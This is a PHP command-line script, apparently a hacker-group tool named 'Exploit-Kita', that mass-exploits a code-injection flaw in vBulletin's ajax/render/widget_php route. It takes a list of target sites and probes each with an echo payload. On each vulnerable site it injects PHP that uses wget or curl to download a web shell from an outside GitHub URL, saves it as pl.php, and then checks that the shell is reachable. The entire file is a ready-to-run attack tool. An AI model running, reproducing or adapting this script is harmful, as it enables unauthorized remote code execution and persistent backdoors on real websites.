<?php
### Con7ext
### Exploit-Kita
function xCurl($url, $post = null){
  $x = curl_init();
  curl_setopt($x, CURLOPT_URL, $url);
  curl_setopt($x, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($x, CURLOPT_TIMEOUT, 5);
  if($post && !empty($post)){
    curl_setopt($x, CURLOPT_POSTFIELDS, $post);
  }
  $xx = curl_exec($x);
  $h = curl_getinfo($x, CURLINFO_HTTP_CODE);
  return [
    "head" => $h,
    "body" => $xx
  ];
}
if(!$argv[1]){
  exit("Usage: php ".$argv[0]." <LIST>");
}
$bl = "\033[0;34m";
$gr = "\033[0;32m";
$re = "\033[0;31m";
$wh = "\033[1;37m";
$shellname = "pl.php"; // setting uploader name
$payloadV = "routestring=ajax/render/widget_php&widgetConfig[code]=echo 'rintod'; exit;";
$payloadS = 'routestring=ajax/render/widget_php&widgetConfig[code]=$c = popen("wget https://raw.githubusercontent.com/rintod/toolol/master/payload.php -O '.$shellname.'"); echo fread($c, 1024); exit;';
$payloadB = 'routestring=ajax/render/widget_php&widgetConfig[code]=$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/rintod/toolol/master/payload.php"); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $ajg = curl_exec($ch);$f=fopen("'.$shellname.'", "a+");fwrite($f, $ajg);fclose($f);echo "rintod";exit;'; 
$m = file_get_contents($argv[1]);
$c = explode("\n", $m);
echo " 
      __________      .__  .__          __  .__        
___  _\______   \__ __|  | |  |   _____/  |_|__| ____  
\  \/ /|    |  _/  |  \  | |  | _/ __ \   __\  |/    \ 
 \   / |    |   \  |  /  |_|  |_\  ___/|  | |  |   |  \
  \_/  |______  /____/|____/____/\___  >__| |__|___|  /
Exploit-Kita  \/     MASS EXPLOIT    \/   Con7ext   \/\n
";
foreach($c as $s){
  $mek = xCurl($s, $payloadV);
  if(preg_match("/rintod/", $mek["body"])){
    echo "[$bl+$wh] ". $s . " > {$gr}Vuln$wh\n";
    //echo $mek["body"];
    echo "[$bl+$wh] {$bl}Uploading Shell$wh\n";
    xCurl($s, $payloadS);
    echo "[$bl+$wh] {$bl}Checking Shell$wh\n";
    $moe = xCurl($s."/".$shellname);
    if($moe["head"] == 200){
      echo "[$bl+$wh] {$gr}{$s}/$shellname > Shell Found$wh\n\n";
    }
    else{
      echo "[$re-$wh] {$re}{$s}/$shellname > Shell Not Found $wh [$gr!$wh] {$bl}Trying To Bypass!!!$wh\n";
      echo "[$bl+$wh] {$bl}Get Content$wh\n";
      $mox = xCurl($s, $payloadB);
      if(preg_match("/rintod/", $mox["body"])){
        echo "[$bl+$wh] {$gr}{$s}/$shellname > Bypass Success$wh\n\n";
      }
      else{
        echo "[$re-$wh] {$re}{$s}/$shellname > Bypass Failed $wh [$bl!$wh] Try Manual\n\n";
        //echo $mox["body"];
      }
    }
  }
  else{
    echo "[$re-$wh] {$re}". $s . " > Failed$wh\n\n";
  }
}
echo $wh;
